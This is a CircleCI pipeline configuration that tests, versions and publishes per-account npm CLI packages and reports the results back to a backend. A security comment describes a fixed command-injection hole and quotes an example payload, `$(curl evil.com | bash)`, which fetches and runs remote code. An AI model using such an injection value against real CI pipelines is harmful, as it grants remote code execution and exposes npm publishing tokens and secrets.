version: 2.1

# ── CircleCI context required ─────────────────────────────────────────────────
#
#   agnt-production (existing — also used by agnt-backend's own deploy jobs)
#     NPM_TOKEN                    npm publish access for the @agnt-sdk scope
#     PORTAL_CLI_RELEASE_SECRET    must match agnt-backend's env var of the same
#                                   name — authenticates release_builds' call to
#                                   POST /portal/portal-cli/release
#     CIRCLECI_WEBHOOK_SECRET      must match agnt-backend's env var of the same
#                                   name (already present) — also attached to
#                                   hydrate_build_publish, since that job posts
#                                   back to POST /portal/portal-cli/webhook too
#
# Originally referenced two contexts (agnt-npm-publish, agnt-release) that were
# never actually created in this CircleCI org — every run of release_builds
# and hydrate_build_publish failed as a result until this was caught and fixed.
# ─────────────────────────────────────────────────────────────────────────────

# ── Pipeline parameters ────────────────────────────────────────────────────────
# Git-push-triggered pipelines use the defaults below (run_publish: false),
# which routes into the `build-and-test` workflow. agnt-backend's
# portalCliPublishController triggers this same project via the CircleCI API
# with run_publish: true and the account_* / build_id / webhook_url params
# filled in, which routes into `publish-account` instead — one real account
# per API-triggered pipeline, exactly like agnt-portal's Electron build.
parameters:
  run_publish:
    type: boolean
    default: false
  account_slug:
    type: string
    default: ""
  account_name:
    type: string
    default: ""
  build_id:
    type: string
    default: ""
  webhook_url:
    type: string
    default: ""

jobs:
  # Runs on every push, every branch. Hydrates with a fixed dummy account
  # (never a real one — see scripts/hydrate.mjs) since `npm ci`/`npm test`
  # can't run against the repo's literal {{accountSlug}} placeholders.
  test:
    docker:
      - image: cimg/node:20.11
    steps:
      - checkout
      - run:
          name: Hydrate with a dummy test account
          command: node scripts/hydrate.mjs --account-slug test --account-name "Test Account"
      - run:
          # `npm ci` needs a pre-existing package-lock.json — but the checked-in
          # tree still has the literal {{accountSlug}} placeholder in every
          # package.json's `name`, which npm refuses to resolve at all (not
          # just "no lockfile", an outright invalid-package-name error). A
          # valid lockfile can only exist post-hydration, and hydration is
          # fresh every run, so there's no lockfile state that could ever be
          # committed for `npm ci` to consume. `npm install` generates one
          # on the fly instead of requiring it up front.
          name: Install
          command: npm install
      - run:
          # No sync:openapi here — src/generated/api.d.ts is a committed
          # file now (see agnt-backend's sync:openapi, which regenerates it
          # from a local sibling checkout and pushes the diff into this repo
          # directly), not gitignored/CI-only like it used to be. Re-fetching
          # it here would just make this job depend on agnt-backend's live
          # /openapi.json being up — a dependency the committed-file design
          # exists specifically to remove.
          name: Test
          command: npm test

  # Runs only on push to main, only after `test` passes. Calls agnt-backend's
  # hidden fan-out endpoint, which republishes every account that has the CLI
  # enabled — so a fix to this shared template doesn't silently go stale on
  # already-published per-account packages. Requires the PORTAL_CLI_RELEASE_SECRET
  # env var (see the agnt-release context referenced below) to match what's
  # configured in agnt-backend's secrets.
  release_builds:
    docker:
      - image: cimg/base:current
    steps:
      - run:
          name: Trigger release-all on agnt-backend
          command: |
            curl -sf -X POST "${AGNT_API_URL:-https://api.agnt.ai}/portal/portal-cli/release" \
              -H "x-release-secret: ${PORTAL_CLI_RELEASE_SECRET}" \
              -H "Content-Type: application/json"

  # One real account, API-triggered (run_publish: true). Hydrates the repo
  # with that account's real slug/name, bumps the package version past
  # whatever's currently published (npm rejects republishing an unchanged
  # version — this can't be a manual version-bump commit like the Electron
  # build uses, since this job runs automatically and often), builds, and
  # publishes. Reports success/failure back to agnt-backend either way so the
  # PortalCliPublish record (and the console's CLI tab) reflects the outcome.
  #
  # SECURITY: account_name (and, defense-in-depth, every other pipeline
  # parameter this job uses) is passed via `environment:` below and read as
  # a shell env var ("$ACCOUNT_NAME", quoted), NOT interpolated directly into
  # a `command:` string as `<< pipeline.parameters.account_name >>`.
  #
  # CircleCI substitutes `<<...>>` pipeline-parameter syntax into `command:`
  # text as raw, unescaped characters BEFORE the shell ever runs — so a
  # value like `$(curl evil.com | bash)` gets pasted verbatim into the
  # script and executed, even inside double quotes, because the substitution
  # happens at config-compile time, not as a shell-safe argument. account_name
  # is free text set by any ordinary account owner (agnt-backend's
  # portalCliPublishController triggers this pipeline with it), so this WAS
  # exploitable by any self-serve account with the CLI enabled — full RCE in
  # this job's container, with access to NPM_TOKEN (publish rights to the
  # entire @agnt-sdk npm scope) and the release/webhook secrets.
  #
  # `environment:` values are also compile-time-substituted from pipeline
  # parameters, but the result becomes the literal VALUE of an env var, not
  # text spliced into a command the shell re-parses — so a malicious
  # account_name just ends up as an inert string in $ACCOUNT_NAME. Do NOT
  # reintroduce `<< pipeline.parameters.* >>` inside any `command:`/`run:`
  # shell block in this file — route it through `environment:` instead, same
  # as this job does now.
  hydrate_build_publish:
    docker:
      - image: cimg/node:20.11
    environment:
      ACCOUNT_SLUG: << pipeline.parameters.account_slug >>
      ACCOUNT_NAME: << pipeline.parameters.account_name >>
      BUILD_ID: << pipeline.parameters.build_id >>
      WEBHOOK_URL: << pipeline.parameters.webhook_url >>
    steps:
      - checkout
      - run:
          name: Hydrate with the real account
          command: |
            node scripts/hydrate.mjs \
              --account-slug "$ACCOUNT_SLUG" \
              --account-name "$ACCOUNT_NAME"
      - run:
          # See the `test` job's Install step for why this is `npm install`,
          # not `npm ci` — no lockfile can validly exist pre-hydration.
          name: Install
          command: npm install
      - run:
          name: Bump version past whatever's currently published
          command: |
            cd packages/portal-cli
            PKG_NAME=$(node -p "require('./package.json').name")
            CURRENT=$(npm view "$PKG_NAME" version 2>/dev/null || echo "")
            node -e "
              const fs = require('fs');
              const pkg = JSON.parse(fs.readFileSync('package.json', 'utf8'));
              const current = '$CURRENT';
              if (current) {
                const [maj, min, patch] = current.split('.').map(Number);
                pkg.version = [maj, min, patch + 1].join('.');
              }
              // else: nothing published yet under this name — keep the checked-in version (0.1.0).
              fs.writeFileSync('package.json', JSON.stringify(pkg, null, 2) + '\n');
              console.log('Publishing version:', pkg.version);
            "
      - run:
          name: Build
          command: npm run build
      - run:
          name: Publish to npm
          command: |
            echo "//registry.npmjs.org/:_authToken=${NPM_TOKEN}" > ~/.npmrc
            cd packages/portal-cli
            npm publish
      - run:
          name: Report success
          when: on_success
          command: |
            VERSION=$(node -p "require('./packages/portal-cli/package.json').version")
            curl -sf -X POST "$WEBHOOK_URL" \
              -H "x-webhook-secret: ${CIRCLECI_WEBHOOK_SECRET}" \
              -H "Content-Type: application/json" \
              -d "{\"buildId\":\"$BUILD_ID\",\"status\":\"success\",\"npmPackageVersion\":\"$VERSION\"}"
      - run:
          name: Report failure
          when: on_fail
          command: |
            curl -sf -X POST "$WEBHOOK_URL" \
              -H "x-webhook-secret: ${CIRCLECI_WEBHOOK_SECRET}" \
              -H "Content-Type: application/json" \
              -d "{\"buildId\":\"$BUILD_ID\",\"status\":\"failed\",\"error\":\"build or publish step failed — see CircleCI logs\"}"

workflows:
  build-and-test:
    when:
      not: << pipeline.parameters.run_publish >>
    jobs:
      - test
      # Manual gate, same pattern as the other repos' approve/hold-production
      # step — a merge to main runs tests immediately, but release_builds
      # (which fans out to a real npm publish for every account with the CLI
      # enabled, via agnt-backend's release-all endpoint) waits for someone
      # to click approve in the CircleCI UI, not automatically.
      - approve_release:
          type: approval
          requires:
            - test
          filters:
            branches:
              only: main
      - release_builds:
          requires:
            - approve_release
          filters:
            branches:
              only: main
          # agnt-release/agnt-npm-publish (originally referenced here and
          # below) never existed in this CircleCI org — every run of both
          # jobs failed as a result. agnt-production already exists, already
          # carries CIRCLECI_WEBHOOK_SECRET (matching agnt-backend's own
          # value), and now also has NPM_TOKEN + PORTAL_CLI_RELEASE_SECRET
          # added — reusing it instead of creating new contexts.
          context: agnt-production

  publish-account:
    when: << pipeline.parameters.run_publish >>
    jobs:
      - hydrate_build_publish:
          # Single context, same one release_builds now uses — see that
          # job's comment. Carries NPM_TOKEN, CIRCLECI_WEBHOOK_SECRET, and
          # (unused here, harmless) PORTAL_CLI_RELEASE_SECRET all at once.
          context: agnt-production
